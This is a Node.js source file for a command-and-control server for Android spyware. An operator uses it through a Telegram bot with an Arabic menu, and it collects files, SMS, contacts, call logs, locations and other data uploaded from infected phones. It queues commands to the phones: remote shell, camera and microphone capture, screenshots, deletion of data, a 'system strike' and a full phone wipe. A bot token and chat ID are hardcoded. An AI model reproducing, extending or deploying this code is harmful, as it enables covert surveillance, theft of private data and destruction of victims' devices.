const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const TOKEN = process.env.TG_TOKEN || '8957851868:AAEbX66SIES_pqt2OyDAZHN94KgqUAWxqTM';
const CHAT_ID = process.env.TG_ID || '8868615222';
const PORT = process.env.PORT || 8999;
const DB_FILE = path.join(__dirname, 'devices.json');

const app = express();
const appServer = http.createServer(app);
const appSocket = new WebSocket.Server({ server: appServer });
const appBot = new TelegramBot(TOKEN, { polling: true });
const appClients = new Map();
const pendingCmds = new Map();
const upload = multer({ limits: { fileSize: 50 * 1024 * 1024 } });

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

function loadDB() {
  try {
    if (fs.existsSync(DB_FILE)) {
      const data = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
      for (const k of Object.keys(data)) appClients.set(k, data[k]);
    }
  } catch (e) {}
}
function saveDB() {
  try {
    const obj = {};
    appClients.forEach((v, k) => { obj[k] = v; });
    fs.writeFileSync(DB_FILE, JSON.stringify(obj, null, 2));
  } catch (e) {}
}
loadDB();

app.get('/', (req, res) => res.send('C2 server running'));

app.post('/uploadFile', upload.single('file'), (req, res) => {
  if (!req.file) { res.send(''); return; }
  const model = req.body.model || 'device';
  const uuid = req.body.uuid || model;
  if (appClients.has(uuid)) appClients.get(uuid).lastSeen = Date.now();
  appBot.sendDocument(CHAT_ID, req.file.buffer, {
    caption: `📁 من <b>${model}</b>\n${req.file.originalname}`
  }, { filename: req.file.originalname, contentType: 'application/octet-stream' }).catch(() => {});
  res.send('ok');
});

app.post('/uploadText', (req, res) => {
  const model = req.body.model || 'device';
  const uuid = req.body.uuid || model;
  const text = req.body.text || '';
  if (!appClients.has(uuid)) {
    appClients.set(uuid, { uuid, model, lastSeen: Date.now(), registered: Date.now() });
    saveDB();
    appBot.sendMessage(CHAT_ID, `🟢 <b>جهاز جديد</b>\n📱 ${model}\n🆔 <code>${uuid}</code>`, { parse_mode: 'HTML', reply_markup: mainMenu() }).catch(() => {});
  } else {
    appClients.get(uuid).lastSeen = Date.now();
  }
  if (text && text !== 'PING') {
    appBot.sendMessage(CHAT_ID, `💬 <b>${model}</b>:\n\n${text}`, { parse_mode: 'HTML' }).catch(() => {});
  }
  res.send('ok');
});

app.get('/getCommand', (req, res) => {
    res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");
    res.setHeader("Pragma", "no-cache");
  const uuid = req.query.uuid || req.query.model || '';
  if (!uuid) { res.send('NONE'); return; }
  if (!appClients.has(uuid)) {
    appClients.set(uuid, { uuid, model: uuid, lastSeen: Date.now(), registered: Date.now() });
    saveDB();
  }
  appClients.get(uuid).lastSeen = Date.now();
  const cmd = pendingCmds.get(uuid);
  if (cmd) { pendingCmds.delete(uuid); res.send(cmd); }
  else res.send('NONE');
});

app.post('/uploadLocation', (req, res) => {
  const lat = parseFloat(req.body.lat);
  const lon = parseFloat(req.body.lon);
  const uuid = req.body.uuid || 'unknown';
  const model = req.body.model || 'device';
  if (isNaN(lat) || isNaN(lon)) { res.send('bad'); return; }
  if (appClients.has(uuid)) appClients.get(uuid).lastSeen = Date.now();
  appBot.sendLocation(CHAT_ID, lat, lon, { reply_markup: { inline_keyboard: [[
    { text: '🗺️ خرائط Google', url: `https://maps.google.com/?q=${lat},${lon}` }
  ]] }}).catch(() => {});
  appBot.sendMessage(CHAT_ID, `📍 <b>${model}</b>\n${lat}, ${lon}`, { parse_mode: 'HTML' }).catch(() => {});
  res.send('ok');
});

function queueCmd(uuid, cmd) {
    pendingCmds.set(uuid, cmd);
    // إشعار فوري
    setImmediate(() => { console.log("[CMD] " + uuid + " <- " + cmd); });
}

function mainMenu() {
  return { keyboard: [
    [{ text: '📱 الأجهزة المتصلة' }],
    [{ text: '🎮 لوحة التحكم' }],
    [{ text: '📊 حالة الخادم' }]
  ], resize_keyboard: true };
}

function devicesInline() {
  const kb = [];
  appClients.forEach((entry, key) => {
    const mins = Math.floor((Date.now() - entry.lastSeen) / 60000);
    const status = mins < 1 ? '🟢' : mins < 5 ? '🟡' : '🔴';
    kb.push([{ text: `${status} ${entry.model || key}`, callback_data: `dev:${key}` }]);
  });
  return { inline_keyboard: kb };
}

function devicePanel(uuid) {
  return { inline_keyboard: [
    [{ text: '📱 معلومات كاملة', callback_data: `cmd:device_info:${uuid}` }, { text: '🔋 بطارية', callback_data: `cmd:battery:${uuid}` }],
    [{ text: '💾 تخزين', callback_data: `cmd:storage:${uuid}` }, { text: '🌐 شبكة', callback_data: `cmd:network:${uuid}` }],
    [{ text: '🧠 معالج', callback_data: `cmd:cpu:${uuid}` }, { text: '📊 رام', callback_data: `cmd:ram:${uuid}` }],
    [{ text: '📍 موقع حالي', callback_data: `cmd:location:${uuid}` }, { text: '🗺️ IP Location', callback_data: `cmd:location_ip:${uuid}` }],
    [{ text: '📜 آخر المواقع', callback_data: `cmd:loc_history:${uuid}` }],
    [{ text: '📒 جهات 50', callback_data: `set:contacts:50:${uuid}` }, { text: '📒 جهات الكل', callback_data: `set:contacts:all:${uuid}` }],
    [{ text: '📞 مكالمات 50', callback_data: `set:calls:50:${uuid}` }, { text: '📞 مكالمات الكل', callback_data: `set:calls:all:${uuid}` }],
    [{ text: '📥 واردة', callback_data: `cmd:calls_in:${uuid}` }, { text: '📤 صادرة', callback_data: `cmd:calls_out:${uuid}` }],
    [{ text: '❌ فائتة', callback_data: `cmd:calls_missed:${uuid}` }, { text: '📧 إيميلات', callback_data: `cmd:emails:${uuid}` }],
    [{ text: '✉️ SMS 20', callback_data: `set:messages:20:${uuid}` }, { text: '✉️ SMS 200', callback_data: `set:messages:200:${uuid}` }],
    [{ text: '✉️ كل SMS', callback_data: `set:messages:all:${uuid}` }, { text: '📥 SMS واردة', callback_data: `cmd:sms_in:${uuid}` }],
    [{ text: '📤 SMS صادرة', callback_data: `cmd:sms_out:${uuid}` }],
    [{ text: '📷 صور 10', callback_data: `set:images:10:${uuid}` }, { text: '📷 صور 50', callback_data: `set:images:50:${uuid}` }],
    [{ text: '📷 كل الصور', callback_data: `set:images:all:${uuid}` }, { text: '🎥 فيديو 5', callback_data: `set:videos:5:${uuid}` }],
    [{ text: '🎥 كل الفيديو', callback_data: `set:videos:all:${uuid}` }],
    [{ text: '🎵 صوتيات 10', callback_data: `set:audio:10:${uuid}` }, { text: '🎵 كل الصوتيات', callback_data: `set:audio:all:${uuid}` }],
    [{ text: '📁 ملفات 10', callback_data: `set:files:10:${uuid}` }, { text: '📁 ملفات 100', callback_data: `set:files:100:${uuid}` }],
    [{ text: '📁 كل الملفات', callback_data: `set:files:all:${uuid}` }, { text: '📄 مستندات', callback_data: `set:docs:20:${uuid}` }],
    [{ text: '🗜️ مضغوطات', callback_data: `set:archives:10:${uuid}` }, { text: '📲 APK 10', callback_data: `set:apk:10:${uuid}` }],
    [{ text: '📲 كل APK', callback_data: `set:apk:all:${uuid}` }],
    [{ text: '📦 كل التطبيقات', callback_data: `cmd:apps:${uuid}` }, { text: '📋 حافظة', callback_data: `cmd:clipboard:${uuid}` }],
    [{ text: '📞 SIM', callback_data: `cmd:sim:${uuid}` }, { text: '📶 WiFi', callback_data: `cmd:wifi:${uuid}` }],
    [{ text: '🔔 إشعارات', callback_data: `cmd:notifications:${uuid}` }, { text: '👤 حسابات', callback_data: `cmd:accounts:${uuid}` }],
    [{ text: '📳 اهتزاز 5ث', callback_data: `cmd:vibrate5:${uuid}` }, { text: '📳 اهتزاز مستمر', callback_data: `cmd:vibrate:${uuid}` }],
    [{ text: '📴 إيقاف اهتزاز', callback_data: `cmd:vibrate_off:${uuid}` }],
    [{ text: '🔊 صوت عالي', callback_data: `cmd:volume_max:${uuid}` }, { text: '🔇 كتم', callback_data: `cmd:volume_mute:${uuid}` }],
    [{ text: '💡 فلاش ON', callback_data: `cmd:flash_on:${uuid}` }, { text: '💡 فلاش OFF', callback_data: `cmd:flash_off:${uuid}` }],
    [{ text: '🔒 قفل', callback_data: `cmd:lock:${uuid}` }, { text: '📸 لقطة شاشة', callback_data: `cmd:screenshot:${uuid}` }],
    [{ text: '📷 كاميرا أمامية', callback_data: `cmd:camera_front:${uuid}` }, { text: '📷 كاميرا خلفية', callback_data: `cmd:camera_back:${uuid}` }],
    [{ text: '🎤 تسجيل 30ث', callback_data: `cmd:mic30:${uuid}` }, { text: '🎤 تسجيل 60ث', callback_data: `cmd:mic60:${uuid}` }],
    [{ text: '💬 Toast', callback_data: `askinput:toast:${uuid}` }, { text: '⚡ شل', callback_data: `askinput:shell:${uuid}` }],
    [{ text: '🗑️ حذف ملفات', callback_data: `del:menu:${uuid}` }],
    [{ text: '⚠️ ضرب النظام', callback_data: `del:confirm:system:${uuid}` }, { text: '💥 فرمتت الهاتف', callback_data: `del:confirm:wipe:${uuid}` }],
    [{ text: '🔙 رجوع', callback_data: `menu:devices` }]
  ]};
}

function askCount(uuid, action) {
  const counts = ['5','10','20','50','100','200','500','1000','all'];
  const rows = [];
  for (let i = 0; i < counts.length; i += 3) {
    rows.push(counts.slice(i, i + 3).map(c => ({
      text: c === 'all' ? 'الكل' : c,
      callback_data: `set:${action}:${c}:${uuid}`
    })));
  }
  rows.push([{ text: '❌ إلغاء', callback_data: `dev:${uuid}` }]);
  return { inline_keyboard: rows };
}

function askDelete(uuid) {
  return { inline_keyboard: [
    [{ text: '📷 كل الصور', callback_data: `del:confirm:images:${uuid}` }, { text: '🎥 كل الفيديو', callback_data: `del:confirm:videos:${uuid}` }],
    [{ text: '🎵 كل الصوتيات', callback_data: `del:confirm:audio:${uuid}` }, { text: '📄 كل المستندات', callback_data: `del:confirm:docs:${uuid}` }],
    [{ text: '📲 كل APK', callback_data: `del:confirm:apk:${uuid}` }, { text: '🗜️ المضغوطات', callback_data: `del:confirm:archives:${uuid}` }],
    [{ text: '📁 التنزيلات', callback_data: `del:confirm:downloads:${uuid}` }, { text: '🗂️ كل /sdcard', callback_data: `del:confirm:sdcard:${uuid}` }],
    [{ text: '📞 سجل المكالمات', callback_data: `del:confirm:calls:${uuid}` }, { text: '✉️ كل SMS', callback_data: `del:confirm:sms:${uuid}` }],
    [{ text: '📒 جهات الاتصال', callback_data: `del:confirm:contacts:${uuid}` }],
    [{ text: '⚠️ ضرب النظام', callback_data: `del:confirm:system:${uuid}` }, { text: '💥 فرمتت الهاتف', callback_data: `del:confirm:wipe:${uuid}` }],
    [{ text: '🔙 رجوع', callback_data: `dev:${uuid}` }]
  ]};
}

function confirmDelete(uuid, action) {
  const labels = { system: '⚠️ ضرب النظام', wipe: '💥 فرمتت الهاتف' };
  const label = labels[action] || `حذف ${action}`;
  return { inline_keyboard: [
    [{ text: `✅ نعم، متأكد — ${label}`, callback_data: `del:yes:${action}:${uuid}` }],
    [{ text: '❌ لا، رجوع', callback_data: `del:menu:${uuid}` }]
  ]};
}

appBot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text || '';
  if (chatId != CHAT_ID) return;
  if (msg.reply_to_message) {
    const meta = msg.reply_to_message.text || '';
    const m = meta.match(/\[input:(\w+):([a-f0-9-]+)\]/);
    if (m) {
      const action = m[1], uuid = m[2];
      if (action === 'toast') queueCmd(uuid, `toast:${text}`);
      else if (action === 'shell') queueCmd(uuid, `shell:${text}`);
      appBot.sendMessage(chatId, `✅ أُرسل ${action} للجهاز`).catch(() => {});
      return;
    }
  }
  if (text === '/start') {
    appBot.sendMessage(chatId, `👋 <b>مرحباً apple sauce</b>\n📊 الأجهزة: <b>${appClients.size}</b>`, { parse_mode: 'HTML', reply_markup: mainMenu() });
    return;
  }
  if (text === '📱 الأجهزة المتصلة' || text === '🎮 لوحة التحكم') {
    if (appClients.size === 0) { appBot.sendMessage(chatId, '❎ لا توجد أجهزة'); return; }
    let txt = `📊 <b>الأجهزة (${appClients.size}):</b>\n\n`;
    appClients.forEach((entry, key) => {
      const mins = Math.floor((Date.now() - entry.lastSeen) / 60000);
      const status = mins < 1 ? '🟢' : mins < 5 ? '🟡' : '🔴';
      txt += `${status} <b>${entry.model || key}</b>\n🆔 <code>${key}</code>\n⏱️ ${mins < 1 ? 'الآن' : `قبل ${mins} دقيقة`}\n\n`;
    });
    appBot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: devicesInline() });
    return;
  }
  if (text === '📊 حالة الخادم') {
    appBot.sendMessage(chatId, `📊 أجهزة: <b>${appClients.size}</b>\n💾 DB: ${fs.existsSync(DB_FILE) ? '✅' : '❌'}`, { parse_mode: 'HTML' });
    return;
  }
});

appBot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const data = query.data || '';
  const parts = data.split(':');
  appBot.answerCallbackQuery(query.id).catch(() => {});

  if (parts[0] === 'menu' && parts[1] === 'devices') {
    appBot.editMessageText(`📊 <b>الأجهزة (${appClients.size}):</b>`, {
      chat_id: chatId, message_id: query.message.message_id,
      parse_mode: 'HTML', reply_markup: devicesInline()
    }).catch(() => {});
    return;
  }

  if (parts[0] === 'dev') {
    const uuid = parts[1];
    const entry = appClients.get(uuid);
    if (!entry) { appBot.sendMessage(chatId, '⚠️ غير متصل'); return; }
    const mins = Math.floor((Date.now() - entry.lastSeen) / 60000);
    const status = mins < 1 ? '🟢 متصل' : mins < 5 ? '🟡 خامل' : '🔴 غير متصل';
    appBot.sendMessage(chatId, `📱 <b>${entry.model}</b>\n🆔 <code>${uuid}</code>\n${status}\n\nاختر الأمر:`, {
      parse_mode: 'HTML', reply_markup: devicePanel(uuid)
    });
    return;
  }

  if (parts[0] === 'ask') {
    const action = parts[1], uuid = parts[2];
    const labels = { contacts: '📒 كم جهة؟', calls: '📞 كم مكالمة؟', messages: '✉️ كم رسالة؟',
      images: '📷 كم صورة؟', videos: '🎥 كم فيديو؟', audio: '🎵 كم ملف صوتي؟',
      files: '📁 كم ملف؟', apk: '📲 كم APK؟', archives: '🗜️ كم مضغوط؟', docs: '📄 كم مستند؟' };
    appBot.sendMessage(chatId, labels[action] || 'كم؟', { reply_markup: askCount(uuid, action) });
    return;
  }

  if (parts[0] === 'askinput') {
    const action = parts[1], uuid = parts[2];
    const prompts = { toast: '💬 اكتب الرسالة:', shell: '⚡ اكتب الأمر:' };
    appBot.sendMessage(chatId, `${prompts[action]}\n\n[input:${action}:${uuid}]`, {
      reply_markup: { force_reply: true, selective: true }
    });
    return;
  }

  if (parts[0] === 'set') {
    const action = parts[1], count = parts[2], uuid = parts[3];
    const cmd = count === 'all' ? `${action}:all` : `${action}:${count}`;
    queueCmd(uuid, cmd);
    appBot.sendMessage(chatId, `✅ أُرسل: ${action} (${count})`);
    return;
  }

  if (parts[0] === 'cmd') {
    const action = parts[1], uuid = parts[2];
    if (!appClients.has(uuid)) { appBot.sendMessage(chatId, '⚠️ غير متصل'); return; }
    queueCmd(uuid, action);
    appBot.sendMessage(chatId, `✅ أُرسل: ${action}`);
    return;
  }

  if (parts[0] === 'del' && parts[1] === 'menu') {
    const uuid = parts[2];
    appBot.sendMessage(chatId, '🗑️ اختر ما تحذفه:', { reply_markup: askDelete(uuid) });
    return;
  }

  if (parts[0] === 'del' && parts[1] === 'confirm') {
    const action = parts[2], uuid = parts[3];
    appBot.sendMessage(chatId, `⚠️ متأكد من <b>${action}</b>؟`, {
      parse_mode: 'HTML', reply_markup: confirmDelete(uuid, action)
    });
    return;
  }

  if (parts[0] === 'del' && parts[1] === 'yes') {
    const action = parts[2], uuid = parts[3];
    queueCmd(uuid, `delete:${action}`);
    appBot.sendMessage(chatId, `🗑️ أُرسل: ${action}`);
    return;
  }
});

setInterval(() => {
  let changed = false;
  appClients.forEach((entry, key) => {
    if (Date.now() - entry.lastSeen > 3600000) { appClients.delete(key); changed = true; }
  });
  if (changed) saveDB();
}, 60000);

appBot.on('polling_error', () => {});
appServer.listen(PORT, () => console.log(`[C2] port ${PORT}`));
